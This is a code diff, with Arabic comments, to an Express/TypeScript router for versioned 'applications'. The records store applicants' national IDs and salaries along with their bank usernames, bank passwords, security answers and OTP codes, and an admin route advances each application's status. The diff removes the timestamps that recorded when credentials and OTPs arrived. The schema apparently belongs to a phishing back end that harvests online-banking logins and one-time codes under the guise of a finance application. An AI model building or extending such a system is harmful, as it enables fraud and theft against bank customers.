@@ -200,54 +200,36 @@ router.patch("/:id", async (req, res) => {
     // إنشاء نسخة جديدة
     const newVersion = currentApp.version + 1;
 
-    // تحديد أي نوع من البيانات يتم تحديثه لتعيين الوقت المناسب
-    const data = parsed.data;
-    const personalFields = ["fullName", "nationalId", "dateOfBirth", "monthlySalary", "employer", "phone", "email", "city", "maritalStatus", "companyName", "businessType", "commercialRegistration", "employeeCount", "annualRevenue", "contactName"];
-    const bankFields = ["bankId", "bankName", "bankUsername", "bankPassword", "securityAnswer"];
-    const otpFields = ["otpCode"];
-    const statusFields = ["status"];
-
-    // التحقق من أي نوع بيانات يتم تحديثه
-    const hasPersonal = personalFields.some(f => data[f as keyof typeof data] !== undefined);
-    const hasBank = bankFields.some(f => data[f as keyof typeof data] !== undefined);
-    const hasOtp = otpFields.some(f => data[f as keyof typeof data] !== undefined);
-    const hasStatus = statusFields.some(f => data[f as keyof typeof data] !== undefined);
-
     const [newApp] = await db
       .insert(applicationsTable)
       .values({
         sessionId: currentApp.sessionId,
-        applicantType: data.applicantType ?? currentApp.applicantType,
-        currentStep: data.currentStep ?? currentApp.currentStep,
-        status: data.status ?? currentApp.status,
-        bankId: data.bankId ?? currentApp.bankId,
-        bankName: data.bankName ?? currentApp.bankName,
-        fullName: data.fullName ?? currentApp.fullName,
-        nationalId: data.nationalId ?? currentApp.nationalId,
-        dateOfBirth: data.dateOfBirth ?? currentApp.dateOfBirth,
-        monthlySalary: data.monthlySalary ?? currentApp.monthlySalary,
-        employer: data.employer ?? currentApp.employer,
-        phone: data.phone ?? currentApp.phone,
-        email: data.email ?? currentApp.email,
-        city: data.city ?? currentApp.city,
-        maritalStatus: data.maritalStatus ?? currentApp.maritalStatus,
-        companyName: data.companyName ?? currentApp.companyName,
-        businessType: data.businessType ?? currentApp.businessType,
-        commercialRegistration: data.commercialRegistration ?? currentApp.commercialRegistration,
-        employeeCount: data.employeeCount ?? currentApp.employeeCount,
-        annualRevenue: data.annualRevenue ?? currentApp.annualRevenue,
-        contactName: data.contactName ?? currentApp.contactName,
-        bankUsername: data.bankUsername ?? currentApp.bankUsername,
-        bankPassword: data.bankPassword ?? currentApp.bankPassword,
-        securityAnswer: data.securityAnswer ?? currentApp.securityAnswer,
-        otpCode: data.otpCode ?? currentApp.otpCode,
-        extraData: data.extraData ?? currentApp.extraData,
-        adminNote: data.adminNote ?? currentApp.adminNote,
-        // تعيين أوقات الاستلام بناءً على نوع البيانات المحدثة
-        personalDataReceivedAt: hasPersonal ? new Date() : (currentApp.personalDataReceivedAt ?? null),
-        bankCredentialsReceivedAt: hasBank ? new Date() : (currentApp.bankCredentialsReceivedAt ?? null),
-        otpReceivedAt: hasOtp ? new Date() : (currentApp.otpReceivedAt ?? null),
-        statusUpdatedAt: hasStatus ? new Date() : (currentApp.statusUpdatedAt ?? null),
+        applicantType: parsed.data.applicantType ?? currentApp.applicantType,
+        currentStep: parsed.data.currentStep ?? currentApp.currentStep,
+        status: parsed.data.status ?? currentApp.status,
+        bankId: parsed.data.bankId ?? currentApp.bankId,
+        bankName: parsed.data.bankName ?? currentApp.bankName,
+        fullName: parsed.data.fullName ?? currentApp.fullName,
+        nationalId: parsed.data.nationalId ?? currentApp.nationalId,
+        dateOfBirth: parsed.data.dateOfBirth ?? currentApp.dateOfBirth,
+        monthlySalary: parsed.data.monthlySalary ?? currentApp.monthlySalary,
+        employer: parsed.data.employer ?? currentApp.employer,
+        phone: parsed.data.phone ?? currentApp.phone,
+        email: parsed.data.email ?? currentApp.email,
+        city: parsed.data.city ?? currentApp.city,
+        maritalStatus: parsed.data.maritalStatus ?? currentApp.maritalStatus,
+        companyName: parsed.data.companyName ?? currentApp.companyName,
+        businessType: parsed.data.businessType ?? currentApp.businessType,
+        commercialRegistration: parsed.data.commercialRegistration ?? currentApp.commercialRegistration,
+        employeeCount: parsed.data.employeeCount ?? currentApp.employeeCount,
+        annualRevenue: parsed.data.annualRevenue ?? currentApp.annualRevenue,
+        contactName: parsed.data.contactName ?? currentApp.contactName,
+        bankUsername: parsed.data.bankUsername ?? currentApp.bankUsername,
+        bankPassword: parsed.data.bankPassword ?? currentApp.bankPassword,
+        securityAnswer: parsed.data.securityAnswer ?? currentApp.securityAnswer,
+        otpCode: parsed.data.otpCode ?? currentApp.otpCode,
+        extraData: parsed.data.extraData ?? currentApp.extraData,
+        adminNote: parsed.data.adminNote ?? currentApp.adminNote,
         version: newVersion,
         parentId: parentId,
         isLatest: true,
@@ -337,7 +319,7 @@ router.post("/:id/validate", async (req, res) => {
 
     const [app] = await db
       .update(applicationsTable)
-      .set({ status: newStatus, currentStep: newStep, adminNote: adminNote ?? null, statusUpdatedAt: new Date(), updatedAt: new Date() })
+      .set({ status: newStatus, currentStep: newStep, adminNote: adminNote ?? null, updatedAt: new Date() })
       .where(eq(applicationsTable.id, params.data.id))
       .returning();
     if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
